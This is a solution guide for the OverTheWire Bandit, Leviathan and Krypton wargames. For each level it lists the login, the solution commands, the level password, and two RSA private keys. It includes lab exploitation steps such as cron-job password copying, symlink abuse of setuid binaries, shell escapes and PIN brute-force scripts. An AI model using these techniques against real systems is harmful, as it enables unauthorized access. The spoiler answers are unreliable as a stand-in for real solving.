# OverTheWire
```
https://overthewire.org/wargames/
```

### USE THIS ONLY IF YOUR REALLY STUCK AND TIRED OF FINDING THE PASSWORD AND HAVE NO OTHER WAY.

## THIS IS THE LAST OPTION.

# Bandit
## Level 0:
CMD: 
```bash
ssh bandit0@bandit.labs.overthewire.org -p 2220
```
Password: 
```bash
bandit0
```
Solution:
```bash
ls
cat readme
```
**Password: ZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If**

## Level 1:
CMD:
```bash
ssh bandit1@bandit.labs.overthewire.org -p 2220
```
Password: 
```bash
ZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If
```
Solution:
```bash
cat ./-
```
**Password: 263JGJPfgU6LtdEvgfWU1XP5yac29mFx**

## Level 2:
CMD:
```bash
ssh bandit2@bandit.labs.overthewire.org -p 2220
```
Password: 
```bash
263JGJPfgU6LtdEvgfWU1XP5yac29mFx
```
Solution:
```bash
cat "spaces in this filename"
```
**Password: MNk8KNH3Usiio41PRUEoDFPqfxLPlSmx**

## Level 3:
CMD:
```bash
ssh bandit3@bandit.labs.overthewire.org -p 2220
```
Password: 
```bash
MNk8KNH3Usiio41PRUEoDFPqfxLPlSmx
```
Solution:
```bash
cd inhere
ls -la
cat ./...Hiding-From-You
```
**Password: 2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ**

## Level 4:
CMD:
```bash
ssh bandit4@bandit.labs.overthewire.org -p 2220
```
Password: 
```bash
2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ
```
Solution:
```bash
ls
cd inhere
 ls -la
 file ./-file*
 cat ./-file07
```
**Password: 4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw**

## Level 5:
CMD:
```bash
ssh bandit5@bandit.labs.overthewire.org -p 2220
```
Password: 
```bash
4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw
```
Solution:
```bash
ls
cd inhere
ls -la
find . -type f -size 1033c ! -executable
cat ./maybehere07/.file2
```
**Password: HWasnPhtq9AVKe0dmk45nxy20cvUa6EG**

## Level 6:
CMD:
```bash
ssh bandit6@bandit.labs.overthewire.org -p 2220
```
Password: 
```bash
HWasnPhtq9AVKe0dmk45nxy20cvUa6EG
```
Solution:
```bash
find / -type f -user bandit7 -group bandit6 -size 33c 2>/dev/null
cat /var/lib/dpkg/info/bandit7.password
```
**Password: morbNTDkSW6jIlUc0ymOdMaLnOlFVAaj**

## Level 7:
CMD:
```bash
ssh bandit7@bandit.labs.overthewire.org -p 2220
```
Password: 
```bash
morbNTDkSW6jIlUc0ymOdMaLnOlFVAaj
```
Solution:
```bash
cat data.txt | grep "millionth"
```
**Password: dfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc**

## Level 8:
CMD:
```bash
ssh bandit8@bandit.labs.overthewire.org -p 2220
```
Password: 
```bash
dfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc
```
Solution:
```bash
sort data.txt | uniq -u
```
**Password: 4CKMh1JI91bUIZZPXDqGanal4xvAg0JM**

## Level 9:
CMD:
```bash
ssh bandit9@bandit.labs.overthewire.org -p 2220
```
Password: 
```bash
4CKMh1JI91bUIZZPXDqGanal4xvAg0JM
```
Solution:
```bash
strings data.txt | grep "=.*"
```
**Password: FGUW5ilLVJrxX9kMYMmlN4MgbpfMiqey**

## Level 10:
CMD:
```bash
ssh bandit10@bandit.labs.overthewire.org -p 2220
```
Password: 
```bash
FGUW5ilLVJrxX9kMYMmlN4MgbpfMiqey
```
Solution:
```bash
base64 -d data.txt
```
**Password: dtR173fZKb0RRsDFSGsg2RWnpNVj3qRr**

## Level 11:
CMD:
```bash
ssh bandit11@bandit.labs.overthewire.org -p 2220
```
Password: 
```bash
dtR173fZKb0RRsDFSGsg2RWnpNVj3qRr
```
Solution:
```bash
cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```
**Password: 7x16WNeHIi5YkIhWsfFIqoognUTyj9Q4**

## Level 12:
CMD:
```bash
ssh bandit12@bandit.labs.overthewire.org -p 2220
```
Password: 
```bash
7x16WNeHIi5YkIhWsfFIqoognUTyj9Q4
```
Solution:
```bash
mkdir /tmp/tmp1000099
cd /tmp/tmp1000099
cp ~/data.txt .
mv data.txt hexdump_data
xxd -r hexdump_data compressed_data
mv compressed_data compressed_data.gz
gzip -d compressed_data.gz
mv compressed_data compressed_data.bz2
bzip2 -d compressed_data.bz2
mv compressed_data compressed_data.gz
gzip -d compressed_data.gz
mv compressed_data compressed_data.tar
tar -xf compressed_data.tar
tar -xf data5.bin
bzip2 -d data6.bin
tar -xf data6.bin.out
mv data8.bin data8.gz
gzip -d data8.gz
cat data8
```
**Password: FO5dwFsc0cbaIiH0h8J2eUks2vdTDwAn**

## Level 13:
CMD:
```bash
ssh bandit13@bandit.labs.overthewire.org -p 2220
```
Password: 
```bash
FO5dwFsc0cbaIiH0h8J2eUks2vdTDwAn
```
Solution:
```bash
ssh -i sshkey.private -p 2220 bandit14@localhost
cat /etc/bandit_pass/bandit14
```
**Password: MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS**

## Level 14:
CMD:
```bash
ssh bandit14@bandit.labs.overthewire.org -p 2220
```
Password: 
```bash
MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS
```
Solution:
```bash
echo "MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS" | nc localhost 30000
```
**Password: 8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo**

## Level 15:
CMD:
```bash
ssh bandit15@bandit.labs.overthewire.org -p 2220
```
Password: 
```bash
8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo
```
Solution:
```bash
openssl s_client -connect localhost:30001
```
```bash
8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo
```
**Password: kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx**

## Level 16:
CMD:
```bash
ssh bandit16@bandit.labs.overthewire.org -p 2220
```
Password: 
```bash
kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx
```
Solution:
```bash
echo "kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx" | openssl s_client -quiet -connect localhost:31790
```
**Password:**
```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----
```

## Level 17:
CMD:
```bash
ssh -i Key.txt bandit17@bandit.labs.overthewire.org -p 2220
```
Password: 

Save Password in Key.txt

```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----
```
Solution:
```bash
diff passwords.old passwords.new
```
**Password: x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO**

## Level 18:
CMD:
```bash
ssh bandit18@bandit.labs.overthewire.org -p 2220
```
Password: 
```bash
x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO
```
Solution:
```bash
ssh bandit18@bandit.labs.overthewire.org -p 2220 ls
```
```bash
ssh bandit18@bandit.labs.overthewire.org -p 2220 cat readme
```
**Password: cGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8**

## Level 19:
CMD:
```bash
ssh bandit19@bandit.labs.overthewire.org -p 2220
```
Password: 
```bash
cGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8
```
Solution:
```bash
./bandit20-do cat /etc/bandit_pass/bandit20
```
**Password: 0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO**

## Level 20:
CMD:
```bash
ssh bandit20@bandit.labs.overthewire.org -p 2220
```
Password: 
```bash
0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
```
Solution:

Terminal1:
```bash
nc -lvnp 12345
```
Terminal2:
```bash
./suconnect 12345
```
Terminal1:
```bash
0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
```
**Password: EeoULMCra2q0dSkYj561DX7s1CpBuOBt**

## Level 21:
CMD:
```bash
ssh bandit21@bandit.labs.overthewire.org -p 2220
```
Password: 
```bash
EeoULMCra2q0dSkYj561DX7s1CpBuOBt
```
Solution:
```bash
ls -l /etc/cron.d/
cat /etc/cron.d/cronjob_bandit22
cat /usr/bin/cronjob_bandit22.sh
cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```
**Password: tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q**

## Level 22:
CMD:
```bash
ssh bandit22@bandit.labs.overthewire.org -p 2220
```
Password: 
```bash
tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
```
Solution:
```bash
ls -la /etc/cron.d
cat /etc/cron.d/cronjob_bandit23
cat /usr/bin/cronjob_bandit23.sh
echo I am user bandit23 | md5sum | cut -d ' ' -f 1
cat /tmp/8ca319486bfbbc3663ea0fbe81326349
```
**Password: 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga**

## Level 23:
CMD:
```bash
ssh bandit23@bandit.labs.overthewire.org -p 2220
```
Password: 
```bash
0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
```
Solution:
```bash
ls /etc/cron.d/
cat /etc/cron.d/cronjob_bandit24
cat /usr/bin/cronjob_bandit24.sh
mkdir /tmp/mydir1
chmod 777 /tmp/mydir1
cd /tmp/mydir1
nano myscript.sh
```
```bash
#!/bin/bash

# Copy the password file to your temporary directory
cat /etc/bandit_pass/bandit24 > /tmp/mydir1/bandit24_password
```
```bash
chmod +x /tmp/mydir1/myscript.sh
cp /tmp/mydir1/myscript.sh /var/spool/bandit24/foo/
```
Wait for 60sec for cron job to run
```bash
ls -l /tmp/mydir1
cat /tmp/mydir1/bandit24_password
```
**Password: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8**

## Level 24:
CMD:
```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220
```
Password: 
```bash
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```
Solution:
```bash
mkdir /tmp/mydir1
cd /tmp/mydir1
nano brute1.sh
```
```bash
#!/bin/bash

# Store the password for bandit24
BANDIT24_PASS=$(cat /etc/bandit_pass/bandit24)

# Open a connection to the daemon on port 30002
exec 3<>/dev/tcp/localhost/30002

# Loop through all possible 4-digit PINs
for pin in {0000..9999}; do
    # Send the password and the current PIN to the daemon
    echo "$BANDIT24_PASS $pin" >&3

    # Read the response from the daemon
    read -r response <&3

    # Print the response for debugging purposes
    echo "Response for PIN $pin: $response"

    # Check if the response contains the password for bandit25
    if [[ "$response" == *"Correct!"* ]]; then
        echo "Found the password: $response"
        break
    fi
done

# Close the connection
exec 3>&-
```
```bash
chmod +x brute1.sh
./brute1.sh
```
Output:
Response for PIN 9298: Correct!

So the key is 9297

Now,
```bash
nc localhost 30002
```
```
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 9297
```
**Password: iCi86ttT4KSNe1armKiwbQNmB3YJP3q4**

## Level 25:
CMD:
```bash
ssh bandit25@bandit.labs.overthewire.org -p 2220
```
Password: 
```bash
iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```
Solution:
```bash
ls
cat bandit26.sshkey
```
Save Password in Key26.txt
```
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEApis2AuoooEqeYWamtwX2k5z9uU1Afl2F8VyXQqbv/LTrIwdW
pTfaeRHXzr0Y0a5Oe3GB/+W2+PReif+bPZlzTY1XFwpk+DiHk1kmL0moEW8HJuT9
/5XbnpjSzn0eEAfFax2OcopjrzVqdBJQerkj0puv3UXY07AskgkyD5XepwGAlJOG
xZsMq1oZqQ0W29aBtfykuGie2bxroRjuAPrYM4o3MMmtlNE5fC4G9Ihq0eq73MDi
1ze6d2jIGce873qxn308BA2qhRPJNEbnPev5gI+5tU+UxebW8KLbk0EhoXB953Ix
3lgOIrT9Y6skRjsMSFmC6WN/O7ovu8QzGqxdywIDAQABAoIBAAaXoETtVT9GtpHW
qLaKHgYtLEO1tOFOhInWyolyZgL4inuRRva3CIvVEWK6TcnDyIlNL4MfcerehwGi
il4fQFvLR7E6UFcopvhJiSJHIcvPQ9FfNFR3dYcNOQ/IFvE73bEqMwSISPwiel6w
e1DjF3C7jHaS1s9PJfWFN982aublL/yLbJP+ou3ifdljS7QzjWZA8NRiMwmBGPIh
Yq8weR3jIVQl3ndEYxO7Cr/wXXebZwlP6CPZb67rBy0jg+366mxQbDZIwZYEaUME
zY5izFclr/kKj4s7NTRkC76Yx+rTNP5+BX+JT+rgz5aoQq8ghMw43NYwxjXym/MX
c8X8g0ECgYEA1crBUAR1gSkM+5mGjjoFLJKrFP+IhUHFh25qGI4Dcxxh1f3M53le
wF1rkp5SJnHRFm9IW3gM1JoF0PQxI5aXHRGHphwPeKnsQ/xQBRWCeYpqTme9amJV
tD3aDHkpIhYxkNxqol5gDCAt6tdFSxqPaNfdfsfaAOXiKGrQESUjIBcCgYEAxvmI
2ROJsBXaiM4Iyg9hUpjZIn8TW2UlH76pojFG6/KBd1NcnW3fu0ZUU790wAu7QbbU
i7pieeqCqSYcZsmkhnOvbdx54A6NNCR2btc+si6pDOe1jdsGdXISDRHFb9QxjZCj
6xzWMNvb5n1yUb9w9nfN1PZzATfUsOV+Fy8CbG0CgYEAifkTLwfhqZyLk2huTSWm
pzB0ltWfDpj22MNqVzR3h3d+sHLeJVjPzIe9396rF8KGdNsWsGlWpnJMZKDjgZsz
JQBmMc6UMYRARVP1dIKANN4eY0FSHfEebHcqXLho0mXOUTXe37DWfZza5V9Oify3
JquBd8uUptW1Ue41H4t/ErsCgYEArc5FYtF1QXIlfcDz3oUGz16itUZpgzlb71nd
1cbTm8EupCwWR5I1j+IEQU+JTUQyI1nwWcnKwZI+5kBbKNJUu/mLsRyY/UXYxEZh
ibrNklm94373kV1US/0DlZUDcQba7jz9Yp/C3dT/RlwoIw5mP3UxQCizFspNKOSe
euPeaxUCgYEAntklXwBbokgdDup/u/3ms5Lb/bm22zDOCg2HrlWQCqKEkWkAO6R5
/Wwyqhp/wTl8VXjxWo+W+DmewGdPHGQQ5fFdqgpuQpGUq24YZS8m66v5ANBwd76t
IZdtF5HXs2S5CADTwniUS5mX1HO9l5gUkk+h0cH5JnPtsMCnAUM+BRY=
-----END RSA PRIVATE KEY-----
```
Make your **Terminal size SMALL**
```bash
ssh -i Key26.txt bandit26@bandit.labs.overthewire.org -p 2220
```
Once More Appears press v
```bash
v
```
```bash
:e /etc/bandit_pass/bandit26
```
**Password: s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ**


## Level 26:
CMD:
```bash
ssh bandit26@bandit.labs.overthewire.org -p 2220
```
Password: 
```bash
s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ
```
Solution:

Make your **Terminal size SMALL**

Once More Appears press v
```bash
v
```
```bash
:e /etc/bandit_pass/bandit26
```
```bash
:set shell=/bin/bash
```
```bash
:shell
```
```bash
ls
./bandit27-do cat /etc/bandit_pass/bandit27
```
**Password: upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB**

## Level 27:
CMD:
```bash
ssh bandit27@bandit.labs.overthewire.org -p 2220
```
Password: 
```bash
upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB
```
Solution:
```bash
mkdir /tmp/mydir3
cd /tmp/mydir3
git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo
```
```bash
upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB
```
```bash
ls
cat README
```
**Password: Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN**

## Level 28:
CMD:
```bash
ssh bandit28@bandit.labs.overthewire.org -p 2220
```
Password: 
```bash
Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN
```
Solution:
```bash
mkdir /tmp/mydir4
cd /tmp/mydir4
git clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repo
```
```bash
Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN
```
```bash
ls
cd repo
ls
cat README.md
git log
git show
```
**Password: 4pT1t5DENaYuqnqvadYs1oE4QLCdjmJ7**

## Level 29:
CMD:
```bash
ssh bandit29@bandit.labs.overthewire.org -p 2220
```
Password: 
```bash
4pT1t5DENaYuqnqvadYs1oE4QLCdjmJ7
```
Solution:
```bash
mkdir /tmp/mydir5
cd /tmp/mydir5
git clone ssh://bandit29-git@localhost:2220/home/bandit29-git/repo
```
```bash
4pT1t5DENaYuqnqvadYs1oE4QLCdjmJ7
```
```bash
ls
cd repo
ls
cat README.md
git branch -a
git checkout remotes/origin/dev
ls
cat README.md
```
**Password: qp30ex3VLz5MDG1n91YowTv4Q8l7CDZL**

## Level 30:
CMD:
```bash
ssh bandit30@bandit.labs.overthewire.org -p 2220
```
Password: 
```bash
qp30ex3VLz5MDG1n91YowTv4Q8l7CDZL
```
Solution:
```bash
mkdir /tmp/mydir6
cd /tmp/mydir6
git clone ssh://bandit30-git@localhost:2220/home/bandit30-git/repo
```
```bash
qp30ex3VLz5MDG1n91YowTv4Q8l7CDZL
```
```bash
ls
cd repo
ls
cat README.md
git tag
git show secret
```
**Password: fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy**

## Level 31:
CMD:
```bash
ssh bandit31@bandit.labs.overthewire.org -p 2220
```
Password: 
```bash
fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy
```
Solution:
```bash
mkdir /tmp/mydir7
cd /tmp/mydir7
git clone ssh://bandit31-git@localhost:2220/home/bandit31-git/repo
```
```bash
fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy
```
```bash
ls
cd repo
ls
cat README.md
echo 'May I come in?' > key.txt
git add -f key.txt
git commit -m "Add key.txt"
git push origin master
```
```
fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy
```
**Password: 3O9RfhqyAlVBEZpVb6LYStshZoqoSx5K**

## Level 32:
CMD:
```bash
ssh bandit32@bandit.labs.overthewire.org -p 2220
```
Password: 
```bash
3O9RfhqyAlVBEZpVb6LYStshZoqoSx5K
```
Solution:
```bash
$0
```
```bash
cat /etc/bandit_pass/bandit33
```
**Password: tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0**

## Level 33:
CMD:
```bash
ssh bandit33@bandit.labs.overthewire.org -p 2220
```
Password: 
```bash
tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0
```
Solution:
```bash
ls
cat README.txt
```
**Password:**

```bash
Congratulations on solving the last level of this game!

At this moment, there are no more levels to play in this game. However, we are constantly working
on new levels and will most likely expand this game with more levels soon.
Keep an eye out for an announcement on our usual communication channels!
In the meantime, you could play some of our other wargames.

If you have an idea for an awesome new level, please let us know!
bandit33@bandit:~$
```

# Natas
## Level 0:
Website:
```bash
http://natas0.natas.labs.overthewire.org
```
Username:
```bash
natas0
```
Passowrd:
```bash
natas0
```
Solution:
```bash
```
**Password: **

# Leviathan
## Level 0:
CMD:
```bash
ssh leviathan0@leviathan.labs.overthewire.org -p 2223
```
Passowrd:
```bash
leviathan0
```
Solution:
```bash
cd /etc/leviathan_pass
ls
ls -la ~
cd ~/.backup
ls -la ~/.backup
cat ~/.backup/bookmarks.html
grep -i "password" ~/.backup/bookmarks.html
grep -i "leviathan1" ~/.backup/bookmarks.html
```
**Password: 3QJ3TgzHDq**

## Level 1:
CMD:
```bash
ssh leviathan1@leviathan.labs.overthewire.org -p 2223
```
Passowrd:
```bash
3QJ3TgzHDq
```
Solution:
```bash
ls -la ~
./check
```
```bash
a
```
```bash
ltrace ./check
```
```bash
a
```
```bash
./check
```
```bash
sex
```
```bash
cat /etc/leviathan_pass/leviathan2
```
**Password: NsN1HwFoyN**

## Level 2:
CMD:
```bash
ssh leviathan2@leviathan.labs.overthewire.org -p 2223
```
Passowrd:
```bash
NsN1HwFoyN
```
Solution:
```bash
ls -la
./printfile
./printfile /etc/leviathan_pass/leviathan3
ltrace ./printfile
mkdir /tmp/mydir8
touch /tmp/mydir8/"test file.txt"
ls -la /tmp/mydir8
./printfile /tmp/mydir8/"test file.txt"
ln -s /etc/leviathan_pass/leviathan3 /tmp/mydir8/test
ls -la /tmp/mydir8
./printfile /tmp/mydir8/"test file.txt"
```
**Password: f0n8h2iWLP**

## Level 3:
CMD:
```bash
ssh leviathan3@leviathan.labs.overthewire.org -p 2223
```
Passowrd:
```bash
f0n8h2iWLP
```
Solution:
```bash
ls -la
ltrace ./level3
```
Enter Something and in the next line you can see,
`strcmp("\n", "snlprintf\n")`

```bash
snlprintf
```
```bash
/bin/bash -p
```
```bash
whoami
cat /etc/leviathan_pass/leviathan4
```
**Password: WG1egElCvO**

## Level 4:
CMD:
```bash
ssh leviathan4@leviathan.labs.overthewire.org -p 2223
```
Passowrd:
```bash
WG1egElCvO
```
Solution:
```bash
ls -la
cd .trash
ls
./bin
```
Convert Binary to Chr using Python
```bash
echo "00110000 01100100 01111001 01111000 01010100 00110111 01000110 00110100 01010001 01000100 00001010" | python3 -c 'import sys; print("".join([chr(int(x,2)) for x in sys.stdin.read().split()]))'
```
**Password: 0dyxT7F4QD**

## Level 5:
CMD:
```bash
ssh leviathan5@leviathan.labs.overthewire.org -p 2223
```
Passowrd:
```bash
0dyxT7F4QD
```
Solution:
```bash
ls -la
./leviathan5
ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
```
**Password: szo7HDB88w**

## Level 6:
CMD:
```bash
ssh leviathan6@leviathan.labs.overthewire.org -p 2223
```
Passowrd:
```bash
szo7HDB88w
```
Solution:
```bash
ls -la
./leviathan6
./leviathan6 0000
mkdir /tmp/tmp12345
cd /tmp/tmp12345
nano bruteforce.sh
```
Bruteforcing script
```bash
#!/bin/bash
cd /home/leviathan6
for i in $(seq -w 0000 9999); do
    echo "Trying code: $i"
    ./leviathan6 $i | grep -q "Wrong" || { echo "Correct code: $i"; break; }
done
```
```bash
chmod +x bruteforce.sh
./bruteforce.sh
cd ~
./leviathan6 7123
```
```bash
whoami
cat /etc/leviathan_pass/leviathan7
```
**Password: qEs5Io5yM8**

## Level 7:
CMD:
```bash
ssh leviathan7@leviathan.labs.overthewire.org -p 2223
```
Passowrd:
```bash
qEs5Io5yM8
```
Solution:
```bash
ls
cat CONGRATULATIONS
```
**Password:**
```bash 
Well Done, you seem to have used a *nix system before, now try something more serious.
(Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)
```

# Krypton
## Level 0
Solution:
```bash
echo "S1JZUFRPTklTR1JFQVQ=" | base64 --decode
```
**Password: KRYPTONISGREAT**

## Level 1
CMD:
```bash
ssh krypton1@krypton.labs.overthewire.org -p 2231
```
Passowrd:
```bash
KRYPTONISGREAT
```
Solution:
```bash
cd /krypton/krypton1
ls
cat README
cat krypton2
```
Run the Python code.
```python3
import codecs
ciphertext = "YRIRY GJB CNFFJBEQ EBGGRA"
plaintext = codecs.decode(ciphertext, 'rot_13')
print(plaintext)
```
Output:
```bash
LEVEL TWO PASSWORD ROTTEN
```
**Password: ROTTEN**

## Level 2
CMD:
```bash
ssh krypton2@krypton.labs.overthewire.org -p 2231
```
Passowrd:
```bash
ROTTEN
```
Solution:
```bash
cd /krypton/krypton2
ls
./encrypt
cat README
cat krypton3
```
Output `OMQEMDUEQMEK`
```bash
temp_dir=$(mktemp -d)
cd $temp_dir
ln -s /krypton/krypton2/keyfile.dat keyfile.dat
chmod 777 .
echo "A" | /krypton/krypton2/encrypt
/krypton/krypton2/encrypt plaintext.txt
cat ciphertext
echo "ABCDEFGHIJKLMNOPQRSTUVWXYZ" > plaintext.txt
/krypton/krypton2/encrypt plaintext.txt
cat ciphertext
```
Now We know it is Ceaser Cipher shifted 12 times

Run the Python code.
```python3
def caesar_decrypt(ciphertext, shift):
    decrypted = ""
    for char in ciphertext:
        if char.isalpha():
            base = ord('A') if char.isupper() else ord('a')
            decrypted += chr((ord(char) - base - shift) % 26 + base)
        else:
            decrypted += char
    return decrypted

ciphertext = "OMQEMDUEQMEK"
shift = 12

print(caesar_decrypt(ciphertext, shift))
```
